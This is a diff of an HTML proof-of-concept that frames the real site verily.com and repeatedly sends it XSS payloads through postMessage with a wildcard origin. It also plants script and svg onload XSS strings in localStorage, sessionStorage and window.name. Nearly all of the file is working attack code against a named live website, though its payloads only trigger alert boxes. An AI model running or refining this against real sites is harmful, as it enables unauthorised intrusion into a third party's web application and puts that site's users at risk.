@@ -1,17 +1,40 @@
-<!-- verily-xss-poc.html -->
 <!DOCTYPE html>
 <html>
-  <body>
-    <iframe id="victim" src="https://verily.com/" width="800" height="600"></iframe>
-    <script>
-      const iframe = document.getElementById("victim");
-      iframe.onload = () => {
-        console.log("✅ iframe loaded");
-        iframe.contentWindow.postMessage({
-          html: "<img src=x onerror=alert(1)>",
-        }, "*");
-        console.log("🚀 XSS payload sent via postMessage");
-      };
-    </script>
-  </body>
+<head>
+  <title>🔥 Verily postMessage XSS Attempt</title>
+</head>
+<body>
+<h2>🚀 Attempting XSS on Verily via iframe + postMessage</h2>
+
+<iframe id="verily" src="https://verily.com" width="100%" height="600" style="border:1px solid #ccc;"></iframe>
+
+<script>
+const payload = {
+  type: "exploit",
+  content: {
+    html: `<img src=x onerror="alert('🔥 XSS via postMessage')">`
+  }
+};
+
+const iframe = document.getElementById("verily");
+
+iframe.onload = () => {
+  console.log("✅ Verily iframe loaded");
+  
+  // إرسال الرسالة بصيغ متعددة لاختبار الاستجابة
+  for (let i = 0; i < 5; i++) {
+    setTimeout(() => {
+      console.log("📤 Sending postMessage", i);
+      iframe.contentWindow.postMessage(payload, "*");
+    }, i * 1000);
+  }
+
+  // زرع بيانات إضافية
+  localStorage.setItem("test", "<script>alert('XSS')</script>");
+  sessionStorage.setItem("x", "<svg/onload=alert(2)>");
+  window.name = JSON.stringify(payload);
+};
+</script>
+
+</body>
 </html>
